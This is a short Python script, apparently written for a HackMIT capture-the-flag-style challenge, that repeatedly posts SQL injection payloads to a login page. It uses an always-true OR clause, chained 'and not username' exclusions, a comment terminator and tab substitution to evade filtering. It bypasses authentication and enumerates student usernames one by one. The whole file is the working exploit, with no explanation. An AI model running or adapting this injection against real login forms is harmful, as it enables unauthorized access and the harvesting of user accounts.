# -*- coding: utf-8 -*-
import requests

# HINT:  Could not choose a best candidate operator. You might need to add explicit type casts.

url = 'https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/login'
# data = {'username': 'Vivswan_5c6aaa'}
users = ['noam_chomsky', 'john_doe', 'elonos_mosquitos', 'melon_usk', 'Vivswan_5c6aaa', 'abc']
while True:
    data = {
        'username': "' or '1' = '1' ",
        'password': "%"
    }
    for i in users:
        data["username"] += f" and not username='{i}'"
    data["username"] += " --"
    print(data['username'])
    data['username'] = data['username'].replace(" ", " \t ")
    x = requests.post(url, data=data)
    lines = x.text.split("\n")
    for i in lines:
        if i.__contains__("Student"):
            users.append(i.replace("Student:", "").replace("<h5>", "").replace("</h5>", "").strip())

    print(lines)
    print(users)

BpAU-QIvdO6NAkES3SkJzNe7K4I=